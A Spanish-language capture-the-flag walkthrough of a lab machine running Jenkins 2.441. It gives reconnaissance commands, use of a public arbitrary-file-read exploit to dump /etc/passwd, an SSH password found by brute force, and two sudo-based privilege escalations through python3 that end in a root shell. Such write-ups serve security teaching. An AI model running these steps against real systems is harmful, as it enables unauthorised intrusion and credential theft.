```bash
nmap -p- -O -sC -sV 172.17.0.2
```

```bash
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)  
| ssh-hostkey:    
|   256 94:fb:28:59:7f:ae:02:c0:56:46:07:33:8c:ac:52:85 (ECDSA)  
|_  256 43:07:50:30:bb:28:b0:73:9b:7c:0c:4e:3f:c9:bf:02 (ED25519)  
8080/tcp open  http    Jetty 10.0.18  
|_http-title: Site doesn't have a title (text/html;charset=utf-8).  
|_http-server-header: Jetty(10.0.18)  
| http-robots.txt: 1 disallowed entry    
|_/
```

comprobamos ante que tipo de página web estamos
```bash
whatweb http://172.17.0.2:8080  
http://172.17.0.2:8080 [403 Forbidden] Cookies[JSESSIONID.f4851473], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.f485147  
3], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson  
,x-jenkins,x-jenkins-session]
```
es un Jenkins 2.441

buscamos posibles vulnerabilidades por version y éste permite realizar un `local file inclusion` 
```bash
searchsploit jenkins 2.441  
--------------------------------------------------------------------------------- 
Exploit Title                                              |  Path  
----------------------------------------------------------------------------------
Jenkins 2.441 - Local File Inclusion                       | java/webapps/51993.py 
----------------------------------------------------------------------------------
```

aunque ahi pone local file inclusion, es Arbitrary File Read (lectura de archivos arbitrarios).
podemos leer el contenido de los archivos del interior
```bash
cp /usr/share/exploitdb/exploits/java/webapps/51993.py exploit.py
```

**Salida**

```  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin  
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin  
root:x:0:0:root:/root:/bin/bash  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin  
bobby:x:1001:1001::/home/bobby:/bin/bash  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
pinguinito:x:1002:1002::/home/pinguinito:/bin/bash
```
encontramos los usuarios bobby y pinguinito

con pinguinito no encontramos la contrdaseña, pero sí de bobby
```bash
[22][ssh] host: 172.17.0.2   login: bobby   password: chocolate
```

escalada de privilegios
```bash
sudo -l

(pinguinito) NOPASSWD: /usr/bin/python3
```


```bash
touch exploit.py
echo -e "import os\nos.system(\"bash -p\")" > exploit.py
```

Luego, ejecutamos este script con `sudo` como `root`.

```bash
sudo -u pinguinito /usr/bin/python3 exploit.py
```
```
whoami
# pinguinito
```

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```
vemos el contenido del script que podemos ejecutar
```bash
$ cat /opt/script.py    
import shutil  
  
def copiar_archivo(origen, destino):  
   shutil.copy(origen, destino)  
   print(f'Archivo copiado de {origen} a {destino}')  
  
if __name__ == '__main__':  
   origen = '/opt/script.py'  
   destino = '/tmp/script_backup.py'  
   copiar_archivo(origen, destino)
```

```bash
echo "import os" > /opt/script.py
echo 'os.system("bash")' >> /opt/script.py
chmod 777 script.py
sudo /usr/bin/python3 /opt/script.py
```

```bash
whoami
# root
```
